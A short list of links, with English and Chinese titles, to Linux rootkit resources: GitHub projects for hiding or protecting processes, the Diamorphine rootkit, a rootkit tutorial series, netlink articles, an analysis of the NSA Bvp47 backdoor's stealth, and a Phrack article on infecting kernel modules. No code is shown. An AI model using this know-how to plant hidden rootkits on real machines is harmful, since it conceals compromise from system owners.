https://github.com/spiderpig1297/kunkillable

kprochide (kprochide is an LKM for hiding processes from the userland. The module is able to hide multiple processes and is able to dynamically receive new processes to hide.)

https://github.com/spiderpig1297/kprochide

Diamorphine

https://github.com/m0nad/Diamorphine

Linux Rootkits Part 1: Introduction and Workflow

https://xcellerator.github.io/posts/linux_rootkits_01/

https://xcellerator.github.io/tags/rootkit/

netlink实时获取网络信息原理分析

https://www.anquanke.com/post/id/288932

Netlink Communication between Kernel and User space

https://dev.to/zqiu/netlink-communication-between-kernel-and-user-space-2mg1

美国NSA超级后门`Bvp47`的隐身技能：网络隐身1

https://www.freebuf.com/articles/system/365376.html

Linux Rootkit 研究

https://docs-conquer-the-universe.readthedocs.io/zh-cn/latest/linux_rootkit.html

Infecting loadable kernel modules

http://phrack.org/issues/68/11.html#article